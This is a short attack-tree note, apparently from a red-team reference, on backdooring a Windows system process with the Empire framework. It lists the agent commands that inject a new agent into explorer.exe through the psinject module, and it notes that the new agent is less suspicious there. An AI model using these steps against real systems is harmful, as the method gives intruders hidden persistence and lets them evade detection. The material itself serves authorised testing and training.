# Backdoor a Windows system process with empire

## Attack tree

```text
1 Empire agent running on Windows (AND)
2 Interact with agent
    2.1 > usemodule (double tab to list modules available) (AND)
    2.2 > ps (to list all processes running on target and get process id of explorer) (AND)
    2.3 > usemodule management/psinject (AND)
    2.4 > info (to see all options) (AND)
    2.5 > set ProcId [explorer process id] (AND)
    2.6 > set Listener [value] (http in our case) (AND)
    2.7 > execute (AND)
```

## Notes

* A new agent appears, one that is less suspicious, running under explorer.
* This is an example of using an empire post exploitation module. The others go similarly. This example uses windows but the same process works for other OS as well. The modules will be different tnough.